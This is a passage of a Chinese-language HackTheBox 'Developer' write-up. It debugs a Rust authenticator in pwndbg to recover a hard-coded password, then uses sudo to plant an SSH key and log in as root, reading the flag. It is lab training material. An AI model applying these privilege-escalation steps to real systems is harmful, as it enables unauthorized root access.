alt=\"image.png\"></p>\n<p>还因为是小端显示的问题，我们还要对其转换一下</p>\n<pre><code class=\"hljs language-bash\">D5F5F4BE3DD4209E6191795C3432E8A3\n6A812006DC5598A79A95D2D9E3591F76\n//\nA3E832345C7991619E20D43DBEF4F5D5\n761F59E3D9D2959AA79855DC0620816A\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image32.png\" alt=\"image.png\"></p>\n<p>我们将加密和解密函数准备好</p>\n<p>再到下边（代码喂给<code>AI</code>），首先会判断明文长度是否等于<code>32</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">if</span> ( size[1] == 32\n    &#x26;&#x26; (ptr == (u8 *)v5\n     || _mm_movemask_epi8(\n          _mm_and_si128(\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + <span class=\"hljs-number\">1</span>), _mm_loadu_si128(v5 + <span class=\"hljs-number\">1</span>)),\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )\n  {\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image33.png\" alt=\"image.png\"></p>\n<p><code>ptr</code> (我们的解密结果) 的地址被加载到了 <code>RAX</code> 寄存器。<code>v5</code> (程序内置的目标明文) 的地址被加载到了 <code>R15</code> 寄存器。</p>\n<p>通过调试确认一下</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b main\npwndbg> r\npwndbg> b *0x55555555b9b9\nBreakpoint 2 at 0x55555555b9b9\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s super secure login portal!\nEnter your password to access the super user:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //因为期待解密后明文长度是32因此输入32个A\npwndbg> hexdump $rax 32 //获取RAX的值\n+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  │./...D..│\\..k.i.\"│\n+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  │i....,..│...K.WnD│\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">➜  Developer awk <span class=\"hljs-string\">'{for(i=3;i&#x3C;=18;i++) printf $i}'</span> rax\ned2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image34.png\" alt=\"image.png\"></p>\n<p>解密成功，那么<code>R15</code>的值应该就是我们需要的</p>\n<pre><code class=\"hljs language-bash\">pwndbg> hexdump <span class=\"hljs-variable\">$r15</span> 32\n+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 <span class=\"hljs-built_in\">fc</span> 5c 20 23  │..%..j..│x..X.\\.#│\n+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  │l.......│...:.<span class=\"hljs-string\">'.,│\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">➜  Developer awk <span class=\"hljs-string\">'{for(i=3;i&#x3C;=18;i++) printf $i}'</span> r15\nfe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image35.png\" alt=\"image.png\"></p>\n<p>得到重点<code>RustForSecurity@Developer@2021:)</code></p>\n<p>我们到<code>karl</code>的<code>shell</code>中运行程序，会让我们输入我们的公钥</p>\n<pre><code class=\"hljs language-bash\">karl@developer:~$ <span class=\"hljs-built_in\">sudo</span> /root/.auth/authenticator \n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> karl: \nWelcome to TheCyberGeek<span class=\"hljs-string\">'s super secure login portal!\nEnter your password to access the super user: \nRustForSecurity@Developer@2021:)\nYou have successfully authenticated\nEnter your SSH public key in now:\nssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali\nYou may now authenticate as root!\n</span></code></pre>\n<p>然后通过我们的私钥就可以登录到<code>root</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image36.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@developer:~# <span class=\"hljs-built_in\">cat</span> root.txt \n720b2e4080688fxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>很多的知识盲区，或者说是我没耐心，很多地方都要看一下WP才能知道如何走下去</p>\n<p>总的来说难度个人而言 <code>8/10</code> ，泪</p>","title":"HackTheBox - Machine - Developer","date":"2025-06-22","updated":"2025-06-22","tags":["HackTheBox","Linux","CTF","Rrverse","Rust","Django","Tabanbbing","Crack"],"categories":"靶机","comments":true},"recentPosts":[{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}